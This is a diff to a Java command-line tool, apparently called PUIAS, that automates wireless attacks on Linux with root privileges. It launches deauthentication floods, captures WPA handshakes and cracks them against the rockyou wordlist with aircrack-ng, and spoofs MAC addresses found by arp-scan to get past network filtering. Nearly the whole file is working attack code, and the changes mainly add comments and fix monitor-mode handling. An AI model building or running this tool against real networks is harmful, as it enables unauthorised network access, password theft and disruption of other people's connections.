@@ -1,62 +1,68 @@
 package com.company;
 
+
 import java.io.*;
 import java.net.URISyntaxException;
-import java.nio.file.Path;
-import java.nio.file.Paths;
-import java.security.NoSuchAlgorithmException;
 import java.util.ArrayList;
 import java.util.Arrays;
+import java.util.Objects;
 import java.util.Scanner;
 
-public class Main {
-    private static Scanner scanner = new Scanner(System.in);
-    static String wi = "wlp5s0";
-    static String mwi = wi + "mon";
-    static boolean monitorMde = false;
-    static String path;
-    static String scriptDIR;
+class Main {
+    private static final Scanner scanner = new Scanner(System.in);
+    private static String wi = "wlp5s0";
+    private static String mwi = wi + "mon";
+    private static boolean monitorMde = false;
+    private static String scriptDIR;
 
 
     public static void main(String[] args) throws IOException, URISyntaxException {
-        if (System.getProperty("os.name").startsWith("Windows")) { //this program can currently only run on linux
-            System.out.println("Please run within the windows ubuntu filesystem.");
+        if (System.getProperty("os.name").startsWith("Windows")) {
+            System.out.println("Sorry, windows isn't supported yet, please run from a vm.");
             System.exit(0);
         } else if (System.getProperty("os.name").startsWith("mac")) {
             System.out.println("Sorry, macOS isn't supported yet, please run from a vm.");
             System.exit(0);
-        }
+        } //ensure that this is run on linux
 
-        path = new File(Main.class.getProtectionDomain().getCodeSource().getLocation()
-                .toURI()).getPath();
+        String path = new File(Main.class.getProtectionDomain().getCodeSource().getLocation()
+                .toURI()).getPath(); //get jar file path
 
         if (!execute("whoami", false).get(0).equals("root")) {
             System.out.println("run it as root");
             executeNewWindow("sudo java -jar " + path, false);
             System.exit(0);
-        }
+        } //ensure that this script is run with su privileges
 
         checkdep(); //check that necessary dependencies are installed
 
-        scriptDIR = path.replace(path.split(File.separator)[path.split(File.separator).length - 1], "");
+        if (args.length > 0) {
+            if (Objects.equals(args[0], "s"))
+                System.exit(0);
+        }
+
+        scriptDIR = path.replace(path.split(File.separator)[path.split(File.separator).length - 1], ""); //get jar file dir
 
 
         System.out.println("Success! PUIAS has been successfully started ");
+        String in = "";
 
-        while (true) {
+        while (!in.equals("exit")) {
 
             System.out.println("----------------------------------------------------"); //print options
             System.out.println("|Hello what would you like to do today?            |");
             System.out.println("|                                                  |");
             System.out.println("|                                                  |");
-            System.out.println("|edit - edit wireless card name (curently: " + wi + ") |");
+            System.out.println("|edit - edit wireless card name (currently: " + wi + ")|");
             System.out.println("|                                                  |");
             System.out.println("| 1 - launch deauth attack                         |");
             System.out.println("| 2 - launch WPA attack                            |");
             System.out.println("| 3 - launch MAC spoofing attack                   |");
+            System.out.println("|                                                  |");
+            System.out.println("| exit - exit (really?)                            |");
             System.out.println("----------------------------------------------------");
 
-            String in = scanner.nextLine();
+            in = scanner.nextLine();
 
             if (in.equals("edit")) { //change wireless card name
                 System.out.println("Enter card name in standard mode: ");
@@ -68,14 +74,14 @@ public class Main {
                 System.out.println("Done! monitor wireless card is now: " + mwi);
 
             }
-            if (in.equals("1")) {
-                String[] network = getNetwork();
+            if (in.equals("1")) { //deauth mode
+                String[] network = getNetwork(); //get network to deauth
                 String bss = network[0];
-                String ess = network[1];
+                @SuppressWarnings("unused") String ess = network[1];
                 String ch = network[2];
 
 
-                System.out.println("Only deauth all is curently supported, press 1 to confirm");
+                System.out.println("Only deauth all is currently supported, press 1 to confirm");
                 String p = scanner.nextLine();
 
                 if (p.equals("1")) {
@@ -85,29 +91,31 @@ public class Main {
                     scanner.nextLine();
                 }
 
+                //TODO: add targeted deauth
+
 //                if (p.equals("2")) {
 
 //                }
                 stopMonitorMode();
             }
-            if (in.equals("2")) {
-                String[] network = getNetwork();
+            if (in.equals("2")) {//wpa attack mode
+                String[] network = getNetwork(); //get target network
                 String bss = network[0];
+                //noinspection unused
                 String ess = network[1];
                 String ch = network[2];
 
-                executeNewWindow("airodump-ng -c " + ch + " -w " + scriptDIR + "tg" + File.separator + "tg" + " --bssid " + bss + " " + mwi, true);
+                executeNewWindow("airodump-ng -c " + ch + " -w " + scriptDIR + "tg" + File.separator + "tg" + " --bssid " + bss + " " + mwi, true); //get networks 4-way handshake
 
-                System.out.println("attempt to de-auth clients? ");
+                System.out.println("attempt to de-auth clients? ");//to force handshake deauth may be used
                 if (scanner.nextLine().toLowerCase().equals("y")) {
                     executeNewWindow("aireplay-ng -0 0  -a " + bss + " " + mwi, true); //run de-auth
                 }
 
-                System.out.println("press enter when done");
+                System.out.println("press enter when done"); //wait until handshake file is created
                 scanner.nextLine();
 
                 File[] tgscans = new File(scriptDIR + "tg").listFiles(pathname -> pathname.getAbsolutePath().endsWith("cap"));
-
                 assert tgscans != null;
                 Arrays.sort(tgscans);
                 File lasttg_scan = tgscans[tgscans.length - 1]; //get the latest scan
@@ -115,26 +123,32 @@ public class Main {
                 execute("chmod 777 " + lasttg_scan.getAbsolutePath(), true); //allow editing of file
                 System.out.println("got handshake");
 
-                executeNewWindow("aircrack-ng -l netpass -w "+scriptDIR+"rockyou.txt"+" -b "+bss+" "+lasttg_scan.getAbsolutePath() , true); //crack password and save to file
+                executeNewWindow("aircrack-ng -l netpass -w " + scriptDIR + "rockyou.txt" + " -b " + bss + " " + lasttg_scan.getAbsolutePath(), true); //crack password and save password to file
+                //TODO: add john the ripper custom password list generation
 
-                System.out.println("press enter when done");
+                System.out.println("press enter when done");//wait for aircrack
                 scanner.nextLine();
-                File pass = new File("netpass");
-                BufferedReader  npassbr= new BufferedReader(new FileReader(pass));
-                System.out.println("Password: "+npassbr.readLine());
-                npassbr.close();
-                pass.delete();
-                BufferedWriter bufferedWriter = new BufferedWriter(new FileWriter(pass));
-                bufferedWriter.write("Error");
+
+                try {
+                    File pass = new File("netpass");
+                    BufferedReader npassbr = new BufferedReader(new FileReader(pass));
+                    System.out.println("Password: " + npassbr.readLine());//print password
+                    npassbr.close();
+
+                    //noinspection ResultOfMethodCallIgnored
+                    pass.delete();
+                    BufferedWriter bufferedWriter = new BufferedWriter(new FileWriter(pass));
+                    bufferedWriter.write("Error"); //write error in file so if next time aircrack is quit before it found the password no password would be returned
 
 //                execute(scriptDIR+"hashcat-utils-master/src/cap2hccapx.bin "+lasttg_scan.getAbsolutePath()+" "+lasttg_scan.getAbsolutePath().replace(".cap",".hccapx"),false);
+//TODO: add gpu cracking support with hashcat
+                } catch (Exception ignored){System.out.println("Error");}
 
-//                    System.out.println(execute("aireplay-ng -0 100 -a " + bss + " " + mwi, true));
-                stopMonitorMode();
+                stopMonitorMode();//exit monitor mode
 
             }
             if (in.equals("3")) {
-                ArrayList<String> macs = execute("arp-scan -l", true); //get all mac adresses via arp-scan
+                ArrayList<String> macs = execute("arp-scan -l", true); //get all mac addresses via arp-scan
                 macs.remove(0); //remove headers
                 macs.remove(0);
                 macs.remove(macs.size() - 1);
@@ -147,7 +161,7 @@ public class Main {
                 }
                 for (String mac : macs) {
                     if (trymac(mac)) { //try each mac
-                        System.out.println("success! " + mac); //id succesfull print so
+                        System.out.println("success! " + mac); //mac successful, print it
                         break;
                     }
                 }
@@ -155,6 +169,7 @@ public class Main {
             }
         }
     }
+
 
     private static String[] getNetwork() throws IOException {
         startMonitorMode();
@@ -211,21 +226,23 @@ public class Main {
         return new String[]{bss, ess, ch};
     }
 
-    public static void startMonitorMode() {
-        if (!monitorMde) {
-            execute("airmon-ng check kill", true);
-            execute("airmon-ng start " + wi, true);
+    private static void startMonitorMode() {
+        if (!monitorMde) { //if monitor mode is disabled
+            execute("airmon-ng check kill", true); //kill all processes that could interfere with monitor mode
+            execute("airmon-ng start " + wi, true); //start monitor mode
+            monitorMde = true;
         }
     }
 
     private static void setChanel(String ch) {
-        execute("sudo iwconfig " + mwi + " channel " + ch, true);
+        execute("sudo iwconfig " + mwi + " channel " + ch, true); //set monitor wireless card chanel
     }
 
-    public static void stopMonitorMode() {
-        if (!monitorMde) {
-            execute("airmon-ng stop " + mwi, true);
-            execute("service network-manager restart", true);
+    private static void stopMonitorMode() {
+        if (monitorMde) {
+            execute("airmon-ng stop " + mwi, true);//stop monitor mode
+            execute("service network-manager restart", true);//restart networking service
+            monitorMde = false;
         }
     }
 
@@ -235,13 +252,13 @@ public class Main {
         boolean macchanger = checkpackage("macchanger");
         boolean arpscan = checkpackage("arp-scan");
         boolean pkexec = checkpackage("pkexec");
-        boolean hashcat = checkpackage("hashcat");
 
 
         if (!macchanger || !aircrack || !arpscan || !pkexec) {//if any package is missing
             System.out.println("Error, some of the application requirements are missing");
 
             File dep = new File("dep.sh");
+            //noinspection ResultOfMethodCallIgnored
             dep.delete(); //delete existing dep.sh file
             BufferedWriter bufferedWriter = new BufferedWriter(new FileWriter(dep));
             bufferedWriter.write("#!/bin/sh"); //create a new bash script
@@ -273,7 +290,7 @@ public class Main {
     private static boolean checkpackage(String packageS) {
         ArrayList<String> pkg_stat = execute("which " + packageS, false); //check if package is installed via which command
         boolean installed = pkg_stat.size() > 0;
-        System.out.println(packageS + (installed ? " [OK]" : "[!]"));
+        System.out.println(packageS + (installed ? " [OK]" : "[!]")); //print data accordingly
         return installed;
     }
 
@@ -286,43 +303,41 @@ public class Main {
 
         ArrayList<String> out = new ArrayList<>();
         try {
-            Process p = new ProcessBuilder(new String[]{"/bin/sh", "-c", command}).start();
+            Process p = new ProcessBuilder("/bin/sh", "-c", command).start(); //create process from command
 
             p.waitFor(); //wait for process to complete
 
-            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream())); //std::out output
-            BufferedReader error = new BufferedReader(new InputStreamReader(p.getErrorStream())); //std::error output
+            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream())); //std::out buferdreader output
+            BufferedReader error = new BufferedReader(new InputStreamReader(p.getErrorStream())); //std::error buferdreader output
 
             String s;
-
-
             while ((s = br.readLine()) != null) //first read all std::output and append to result
                 out.add(s);
             while ((s = error.readLine()) != null)//then do the same for std error
                 out.add(s);
-            p.destroy();
-            br.close();
+
+            p.destroy();//quit process
+
+            br.close();//close readers
             error.close();
         } catch (Exception ignored) {
-            ignored.printStackTrace();
         }
         return out;
     }
 
-    private static ArrayList<String> executeNewWindow(String command, boolean sudo) {
-        System.out.println(command);
-        if (sudo) {
-            return execute("sudo x-terminal-emulator -e " + command, false);
-
+    private static void executeNewWindow(String command, boolean sudo) {
+        if (sudo) { //pkexce doesn't work well with terminal
+            execute("sudo x-terminal-emulator -e " + command, false); //execute command in a new terminal
+            return; //terminal doesn't return output
         }
-        return execute("x-terminal-emulator -e " + command, false);
+        execute("x-terminal-emulator -e " + command, false);//execute command in a new terminal
     }
 
-    private static ArrayList<String> change_mac(String mac) {
-        ArrayList<String> execute = execute("ifconfig " + wi + " down && pkexec macchanger -m " + mac + " " + wi + "&& pkexec ifconfig " + wi + " up", true); //bring adpter down, change mac, bring it back up again
+    private static void change_mac(String mac) {
+        execute("ifconfig " + wi + " down && pkexec macchanger -m " + mac + " " + wi + "&& pkexec ifconfig " + wi + " up", true);//bring down the network card, change mac, bring it back up
+
         execute("nmcli radio wifi off", true);//restart network adapter
         execute("nmcli radio wifi on", true);
-        return execute;
     }
 
     private static boolean trymac(String mac) {
